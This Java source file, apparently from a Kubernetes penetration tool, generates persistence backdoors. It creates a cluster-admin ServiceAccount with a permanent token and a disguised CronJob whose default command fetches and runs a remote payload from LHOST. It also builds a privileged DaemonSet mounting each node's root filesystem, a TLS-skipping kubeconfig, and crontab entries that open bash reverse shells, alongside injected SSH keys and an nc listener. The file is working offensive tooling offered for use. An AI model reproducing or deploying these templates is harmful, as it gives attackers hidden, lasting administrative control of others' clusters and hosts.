package com.k8spen.tool.helper;

/**
 * 3.权限维持 - 业务逻辑
 * 生成各类持久化YAML和kubeconfig
 */
public class PersistenceHelper {

    private static String yamlQuote(String s) {
        if (s.contains("\"") || s.contains("'") || s.contains(":") || s.contains("#")
                || s.contains("{") || s.contains("}") || s.contains(">") || s.contains("&")) {
            return "'" + s.replace("'", "''") + "'";
        }
        return s;
    }

    // ========== 1. 创建高权ServiceAccount ==========
    public static String generateAdminSA(String namespace, String saName, String roleName) {
        if (namespace == null || namespace.isEmpty()) namespace = "kube-system";
        if (saName == null || saName.isEmpty()) saName = "admin-user";
        if (roleName == null || roleName.isEmpty()) roleName = "admin-bindto-cluster-admin";

        return "# 创建高权ServiceAccount + ClusterRoleBinding\n"
                + "# 等效命令:\n"
                + "# kubectl create serviceaccount " + saName + " -n " + namespace + "\n"
                + "# kubectl create clusterrolebinding " + roleName
                + " --clusterrole=cluster-admin --serviceaccount=" + namespace + ":" + saName + "\n"
                + "---\n"
                + "apiVersion: v1\n"
                + "kind: ServiceAccount\n"
                + "metadata:\n"
                + "  name: " + saName + "\n"
                + "  namespace: " + namespace + "\n"
                + "---\n"
                + "apiVersion: rbac.authorization.k8s.io/v1\n"
                + "kind: ClusterRoleBinding\n"
                + "metadata:\n"
                + "  name: " + roleName + "\n"
                + "roleRef:\n"
                + "  apiGroup: rbac.authorization.k8s.io\n"
                + "  kind: ClusterRole\n"
                + "  name: cluster-admin\n"
                + "subjects:\n"
                + "- kind: ServiceAccount\n"
                + "  name: " + saName + "\n"
                + "  namespace: " + namespace + "\n"
                + "---\n"
                + "# K8s >= 1.24 需要手动创建Secret来获取永久Token\n"
                + "apiVersion: v1\n"
                + "kind: Secret\n"
                + "metadata:\n"
                + "  name: " + saName + "-token\n"
                + "  namespace: " + namespace + "\n"
                + "  annotations:\n"
                + "    kubernetes.io/service-account.name: " + saName + "\n"
                + "type: kubernetes.io/service-account-token\n";
    }

    // ========== 2. CronJob后门 ==========
    public static String generateCronJob(String namespace, String name, String image,
                                          String schedule, String command) {
        if (namespace == null || namespace.isEmpty()) namespace = "kube-system";
        if (name == null || name.isEmpty()) name = "system-monitor";
        if (image == null || image.isEmpty()) image = "alpine";
        if (schedule == null || schedule.isEmpty()) schedule = "*/10 * * * *";
        if (command == null || command.isEmpty()) command = "sh -c 'wget -q http://LHOST/payload.sh -O /tmp/p.sh && sh /tmp/p.sh'";

        return "# CronJob后门 - 定时执行命令\n"
                + "# 等效命令:\n"
                + "# kubectl create cronjob " + name + " --image=" + image
                + " --schedule=\"" + schedule + "\" -- " + command + "\n"
                + "---\n"
                + "apiVersion: batch/v1\n"
                + "kind: CronJob\n"
                + "metadata:\n"
                + "  name: " + name + "\n"
                + "  namespace: " + namespace + "\n"
                + "spec:\n"
                + "  schedule: \"" + schedule + "\"\n"
                + "  successfulJobsHistoryLimit: 0\n"
                + "  failedJobsHistoryLimit: 0\n"
                + "  jobTemplate:\n"
                + "    spec:\n"
                + "      template:\n"
                + "        spec:\n"
                + "          containers:\n"
                + "          - name: " + name + "\n"
                + "            image: " + image + "\n"
                + "            command:\n"
                + "            - sh\n"
                + "            - -c\n"
                + "            - " + yamlQuote(command) + "\n"
                + "          restartPolicy: OnFailure\n"
                + "          hostNetwork: true\n"
                + "          hostPID: true\n";
    }

    // ========== 3. DaemonSet后门 ==========
    public static String generateDaemonSet(String namespace, String name, String image,
                                            String mountPath, String command) {
        if (namespace == null || namespace.isEmpty()) namespace = "kube-system";
        if (name == null || name.isEmpty()) name = "node-exporter";
        if (image == null || image.isEmpty()) image = "alpine";
        if (mountPath == null || mountPath.isEmpty()) mountPath = "/host";
        if (command == null || command.isEmpty()) command = "sh -c 'while true; do sleep 3600; done'";

        return "# DaemonSet后门 - 在每个Node上运行\n"
                + "# 挂载宿主机根目录到 " + mountPath + "\n"
                + "---\n"
                + "apiVersion: apps/v1\n"
                + "kind: DaemonSet\n"
                + "metadata:\n"
                + "  name: " + name + "\n"
                + "  namespace: " + namespace + "\n"
                + "  labels:\n"
                + "    app: " + name + "\n"
                + "spec:\n"
                + "  selector:\n"
                + "    matchLabels:\n"
                + "      app: " + name + "\n"
                + "  template:\n"
                + "    metadata:\n"
                + "      labels:\n"
                + "        app: " + name + "\n"
                + "    spec:\n"
                + "      tolerations:\n"
                + "      - operator: Exists\n"
                + "      hostNetwork: true\n"
                + "      hostPID: true\n"
                + "      containers:\n"
                + "      - name: " + name + "\n"
                + "        image: " + image + "\n"
                + "        command:\n"
                + "        - sh\n"
                + "        - -c\n"
                + "        - " + yamlQuote(command) + "\n"
                + "        securityContext:\n"
                + "          privileged: true\n"
                + "        volumeMounts:\n"
                + "        - name: host-root\n"
                + "          mountPath: " + mountPath + "\n"
                + "      volumes:\n"
                + "      - name: host-root\n"
                + "        hostPath:\n"
                + "          path: /\n";
    }

    // ========== 4. 生成kubeconfig ==========
    public static String generateKubeconfig(String server, String token, String clusterName) {
        if (server == null || server.isEmpty()) return "# 请填写APIServer地址";
        if (token == null || token.isEmpty()) return "# 请填写Token";
        if (clusterName == null || clusterName.isEmpty()) clusterName = "pwned-cluster";

        if (!server.startsWith("https://") && !server.startsWith("http://")) server = "https://" + server;
        String afterScheme = server.substring(server.indexOf("://") + 3);
        if (!afterScheme.contains(":")) {
            server = server + ":6443";
        }

        return "apiVersion: v1\n"
                + "kind: Config\n"
                + "clusters:\n"
                + "- cluster:\n"
                + "    insecure-skip-tls-verify: true\n"
                + "    server: " + server + "\n"
                + "  name: " + clusterName + "\n"
                + "contexts:\n"
                + "- context:\n"
                + "    cluster: " + clusterName + "\n"
                + "    user: " + clusterName + "-admin\n"
                + "  name: " + clusterName + "\n"
                + "current-context: " + clusterName + "\n"
                + "users:\n"
                + "- name: " + clusterName + "-admin\n"
                + "  user:\n"
                + "    token: " + token + "\n";
    }

    // ========== 5. 写入crontab到宿主机 ==========
    public static String generateHostCrontab(String lhost, String lport) {
        if (lhost == null || lhost.isEmpty()) return "# 请填写LHOST";
        if (lport == null || lport.isEmpty()) lport = "4444";

        return "# 通过挂载宿主机写入crontab反弹Shell\n"
                + "# 前提: 已有挂载宿主机根目录的Pod\n\n"
                + "# 1. 写入crontab:\n"
                + "echo '* * * * * root bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1' "
                + ">> /host/etc/crontab\n\n"
                + "# 2. 或写入单独的cron文件:\n"
                + "echo '* * * * * bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1' "
                + "> /host/var/spool/cron/crontabs/root\n\n"
                + "# 3. 写入SSH公钥:\n"
                + "mkdir -p /host/root/.ssh && echo 'YOUR_PUBKEY' >> /host/root/.ssh/authorized_keys\n\n"
                + "# 监听命令:\n"
                + "nc -lvnp " + lport + "\n";
    }
}
